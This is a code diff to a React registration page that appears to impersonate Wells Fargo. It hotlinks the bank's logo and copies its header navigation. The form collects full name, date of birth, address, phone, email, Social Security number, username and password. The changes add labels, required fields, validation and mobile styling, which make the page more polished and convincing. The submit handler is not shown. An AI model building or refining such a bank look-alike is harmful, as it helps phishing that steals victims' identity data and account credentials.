@@ -29,22 +29,25 @@ export default function Register() {
     <div style={{ minHeight: '100vh', display: 'flex', flexDirection: 'column' }}>
       {/* Header */}
       <header style={{ backgroundColor: '#D71E28', borderBottom: '4px solid #FFCD41', height: '56px', display: 'flex', alignItems: 'center' }}>
-        <div className="max-w-[1400px] mx-auto w-full" style={{ padding: '0 32px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
+        <div className="max-w-[1400px] mx-auto w-full wf-section-px" style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
           <a href="/" onClick={(e) => { e.preventDefault(); navigate('/'); }} style={{ textDecoration: 'none' }}>
             <img
               src="https://www17.wellsfargomedia.com/assets/images/rwd/wf_logo_220x23.png"
               alt="Wells Fargo"
-              style={{ height: '20px', filter: 'brightness(0) invert(1)' }}
+              width="180" height="20"
+              style={{ height: '20px', width: 'auto', filter: 'brightness(0) invert(1)' }}
             />
           </a>
-          <nav style={{ display: 'flex', alignItems: 'center', gap: '24px' }}>
+          <nav style={{ display: 'flex', alignItems: 'center', gap: '20px' }}>
             {['Open an Account', 'Customer Service', 'ATMs/Locations', 'Español'].map((item) => (
-              <a key={item}  style={{ color: '#fff', textDecoration: 'none', fontSize: '0.76rem', fontFamily: f }} className="hover:underline">
+              <a key={item} style={{ color: '#fff', textDecoration: 'none', fontSize: '0.76rem', fontFamily: f }} className="wf-hide-mobile hover:underline">
                 {item}
               </a>
             ))}
-            <div style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
+            <div className="wf-hide-mobile" style={{ display: 'flex', alignItems: 'center', gap: '4px' }}>
+              <label htmlFor="headerSearch" style={{ position: 'absolute', left: '-9999px' }}>Search</label>
               <input
+                id="headerSearch"
                 type="text"
                 placeholder="search"
                 style={{
@@ -70,13 +73,12 @@ export default function Register() {
         display: 'flex',
         alignItems: 'center',
         justifyContent: 'center',
-        padding: '40px 20px',
+        padding: '24px 16px',
       }}>
         {/* Form card */}
-        <div style={{
+        <div className="wf-form-card" style={{
           backgroundColor: 'rgba(255,255,255,0.95)',
           borderRadius: '12px',
-          padding: '40px 48px',
           width: '100%',
           maxWidth: '640px',
           boxShadow: '0 8px 32px rgba(0,0,0,0.2)',
@@ -89,36 +91,55 @@ export default function Register() {
           </h1>
 
           <form onSubmit={handleSubmit}>
-            {/* Row 1: Full Name + Advisory Custodian */}
-            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
-              <input type="text" name="fullName" placeholder="Full Name" value={form.fullName} onChange={handleChange} style={inputStyle} />
-              <input type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
+            <div className="wf-form-row">
+              <div>
+                <label htmlFor="fullName" style={{ position: 'absolute', left: '-9999px' }}>Full Name</label>
+                <input id="fullName" type="text" name="fullName" placeholder="Full Name" required value={form.fullName} onChange={handleChange} style={inputStyle} />
+              </div>
+              <div>
+                <label htmlFor="advisoryCustodian" style={{ position: 'absolute', left: '-9999px' }}>Advisory Custodian</label>
+                <input id="advisoryCustodian" type="text" name="advisoryCustodian" placeholder="Advisory Custodian" value={form.advisoryCustodian} onChange={handleChange} style={inputStyle} />
+              </div>
             </div>
 
-            {/* Row 2: DOB + Address */}
-            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
-              <input type="date" name="dob" placeholder="DOB" value={form.dob} onChange={handleChange} style={inputStyle} />
-              <input type="text" name="address" placeholder="Address" value={form.address} onChange={handleChange} style={inputStyle} />
+            <div className="wf-form-row">
+              <div>
+                <label htmlFor="dob" style={{ position: 'absolute', left: '-9999px' }}>Date of Birth</label>
+                <input id="dob" type="date" name="dob" placeholder="DOB" required value={form.dob} onChange={handleChange} style={inputStyle} />
+              </div>
+              <div>
+                <label htmlFor="address" style={{ position: 'absolute', left: '-9999px' }}>Address</label>
+                <input id="address" type="text" name="address" placeholder="Address" required value={form.address} onChange={handleChange} style={inputStyle} />
+              </div>
             </div>
 
-            {/* Row 3: Phone + Email */}
-            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
-              <input type="tel" name="phone" placeholder="Phone Number" value={form.phone} onChange={handleChange} style={inputStyle} />
-              <input type="email" name="email" placeholder="Email" value={form.email} onChange={handleChange} style={inputStyle} />
+            <div className="wf-form-row">
+              <div>
+                <label htmlFor="phone" style={{ position: 'absolute', left: '-9999px' }}>Phone Number</label>
+                <input id="phone" type="tel" name="phone" placeholder="Phone Number" required pattern="[0-9]{10}" value={form.phone} onChange={handleChange} style={inputStyle} />
+              </div>
+              <div>
+                <label htmlFor="email" style={{ position: 'absolute', left: '-9999px' }}>Email</label>
+                <input id="email" type="email" name="email" placeholder="Email" required value={form.email} onChange={handleChange} style={inputStyle} />
+              </div>
             </div>
 
-            {/* Row 4: SSN + Username */}
-            <div style={{ display: 'flex', gap: '16px', marginBottom: '16px' }}>
-              <input type="password" name="ssn" placeholder="SSN" value={form.ssn} onChange={handleChange} style={inputStyle} />
-              <input type="text" name="username" placeholder="Username" value={form.username} onChange={handleChange} style={inputStyle} />
+            <div className="wf-form-row">
+              <div>
+                <label htmlFor="ssn" style={{ position: 'absolute', left: '-9999px' }}>SSN</label>
+                <input id="ssn" type="password" name="ssn" placeholder="SSN" required value={form.ssn} onChange={handleChange} style={inputStyle} />
+              </div>
+              <div>
+                <label htmlFor="username" style={{ position: 'absolute', left: '-9999px' }}>Username</label>
+                <input id="username" type="text" name="username" placeholder="Username" required value={form.username} onChange={handleChange} style={inputStyle} />
+              </div>
             </div>
 
-            {/* Row 5: Password (full width) */}
             <div style={{ marginBottom: '28px' }}>
-              <input type="password" name="password" placeholder="Password" value={form.password} onChange={handleChange} style={inputStyle} />
+              <label htmlFor="password" style={{ position: 'absolute', left: '-9999px' }}>Password</label>
+              <input id="password" type="password" name="password" placeholder="Password" required minLength={8} value={form.password} onChange={handleChange} style={inputStyle} />
             </div>
 
-            {/* Register button */}
             <div style={{ textAlign: 'center' }}>
               <button
                 type="submit"
@@ -133,12 +154,10 @@ export default function Register() {
               </button>
             </div>
 
-            {/* Divider */}
-            <div style={{ textAlign: 'center', margin: '20px 0', color: '#787070', fontSize: '0.88rem', fontFamily: f }}>
+            <div style={{ textAlign: 'center', margin: '20px 0', color: '#555', fontSize: '0.88rem', fontFamily: f }}>
               or
             </div>
 
-            {/* Sign On button */}
             <div style={{ textAlign: 'center' }}>
               <button
                 type="button"
